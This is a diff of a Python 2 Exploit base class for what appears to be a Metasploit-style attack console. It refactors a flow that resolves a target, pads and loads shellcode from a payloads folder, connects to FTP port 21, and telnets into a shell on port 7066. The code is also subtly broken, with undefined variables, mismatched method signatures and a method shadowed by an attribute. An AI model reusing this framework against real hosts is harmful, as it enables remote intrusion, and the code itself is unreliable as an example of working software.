@@ -1,21 +1,80 @@
+import cmd
 class Exploit(cmd.Cmd):
-  def __init__(self, variables, descriptions, name, target, payload):
-    cmd = __import__("cmd")
+  def __init__(self, name, target, payload, variables, descriptions, check=[False]):
     cmd.Cmd.__init__(self)
+    self.prompt = "pdf-console:attack(" + name +")% "
     self.os = __import__("os")
     self.ftplib = __import__("ftplib")
-    _tmp = __import__("random", globals(), locals(), ['randint'])
+    _tmp = __import__("random", globals(), locals(), ['randint', 'choice'])
+    self.choice = _tmp.choice
     self.randint = _tmp.randint
     _tmp = __import__("socket", globals(), locals(), ['socket', 'AF_INET', 'SOCK_STREAM', 'gethostbyname'])
     self.socket = _tmp.socket
     self.AF_INET = _tmp.AF_INET
     self.SOCK_STREAM = _tmp.SOCK_STREAM
     self.gethostbyname = _tmp.gethostbyname
+    _tmp = __import__("string", globals(), locals(), ['letters'])
+    self.letters = _tmp.letters
     self.variables = variables #{"":""}  list of variables
     self.descriptions = descriptions #{"":""} descriptions
     self.name =  name #[""] name of exploit
     self.target = target #[""] target ex: Windows 7 SP1 x86
     self.payload =  payload #[""] name of payload
+    self.check = check
+    self.banner = [""]
+  def rand_text(self, length):
+    return "".join( [self.choice(self.letters) for i in xrange(length)] )
+  def check_vuln(self):
+    print "[+]The host %s is vulnerable!" % self.variables["host"]
+  def check_safe(self):
+    print "[-]The host %s isn't vulnerable. :(" % self.variables["host"]
+  def getToken(self, line):
+    token = ""
+    for letter in line:
+      if letter != " ":
+        token += letter
+      else:
+        break
+    return token
+  def connect(self):
+    s = self.socket(self.AF_INET, self.SOCK_STREAM)
+    s.connect((self.variables["host"], 21))
+    self.banner[0] = s.recv(1024)
+    return s
+  def disconnect(self, s):
+    s.close()
+  def check(self):
+    pass #overwrite this
+  def rand(self, bytes):
+    p = ""
+    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
+    for a in range(0, bytes):
+      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
+      p += tmp.decode('string_escape')
+    return p
+  def check_host(self):
+    for let in "abcdefghijklmnopqrstuvwxyz":
+      if let in self.variables["host"]:
+        self.variables["host"] = self.gethostbyname(self.variables["host"])
+  def get_shellcode(self):
+    payload = ""
+    f = open(self.config.cwd + "/payloads/" + self.payload, "r")
+    for line in f.readlines():
+      payload += line[:-1].decode('string_escape')
+    f.close()
+    return payload
+  def generate(self):
+    pass #overwrite this
+  def deliver(self, payload):
+    pass #overwrite this
+  def init(self):
+    self.check_host()
+    print "[*]Generating payload..."
+    payload = ""
+    return payload
+  def init_deliver(self):
+    print "[+]Payload generated."
+    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
   def help_help(self):
     print "Usage: help [cmd]"
     print "cmd    the command to get help on"
@@ -27,14 +86,14 @@ class Exploit(cmd.Cmd):
     print "set: set a variable to a value"
     print "Note: you MUST use it exactly as shown: no set [var]=[val]!"
   def do_set(self, args):
-    var = getToken(args)
+    var = self.getToken(args)
     val = args[len(var) + 3:]
     for variable in self.variables.keys():
       if variable == var:
         self.variables[variable] = val 
-    else:
-      print "*** Variable not found %s" % var
-      return
+      else:
+        print "*** Variable not found: %s" % var
+        return
     print "[*]%s => %s" % (var, val)
   def help_show(self):
     print "Usage: show options"
@@ -42,41 +101,46 @@ class Exploit(cmd.Cmd):
   def do_show(self, args):
     if args != "options":
       print "*** Unknown argument: " + args
-    print "Target: %s" % self.target[0]
-    print "Options for %s:" % self.name[0]
+      return
+    print "Target: %s" % self.target
+    print "Options for %s:" % self.name
     print "========================"
     for variable in self.variables.keys():
       print "%s    %s    %s" % (variable, self.variables[variable], self.descriptions[variable])
   def help_exit(self):
     print "Usage: exit"
-    print "exit: exit the %s context" % self.name[0]
+    print "exit: exit the %s context" % self.name
   def do_exit(self, args):
     if args:
       print "*** Argument number: needed 0"
       return
     return True
+  def help_check(self):
+    print "Usage: check"
+    print "check: check if target is vulnerable. Some modules do not support this."
+  def do_check(self, args):
+    if args:
+      print "*** Argument number: needed 0"
+      return
+    if self.check[0] == False:
+      print "[-]This module doesn't support the check function."
+    elif self.check[0] == True:
+      self.check()
+    else:
+      print "*** Internal Error: self.check[0] is not set to a boolean value."
   def help_start(self):
     print "Usage: start"
     print "start: start the attack"
   def do_start(self, args):
-    for let in "abcdefghijklmnopqrstuvwxyz":
-      if let in self.variables["host"]:
-        self.variables["host"] = self.gethostbyname(self.variables["host"])
-    print "[*]Generating payload..."
-    char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
-    payload = ""
-    for a in range(0, 2017):
-      tmp = "\\x" + char[randint(0, 15)] + char[randint(0, 15)]
-      payload += tmp.decode('string_escape')
-    f = open("../../../payloads/%s.shell" % self.payload, "r")
-    for line in f.readlines():
-      payload += line[:-1].decode('string_escape')
-    f.close()
-    print "[+]Payload generated."
-    print "[*]Sending payload of size: " + str(len(payload.encode('utf-8')))
-    s = self.socket(self.AF_INET, self.SOCK_STREAM)
-    s.connect((self.variables["host"], 21))
-    s.close()
+    for v in self.variables.keys():
+      if self.variables[v]:
+        pass
+      else:
+        print "*** Variable not set: " + v
+        return
+    payload = self.init()
+    payload = self.generate(payload)
+    self.deliver(payload)
     print "[+]Payload sent."
     print "[*]Connecting..."
-    os.system("telnet %s 7066" % self.variables["host"]) 
+    self.os.system("../../telnet %s 7066" % self.variables["host"]) 
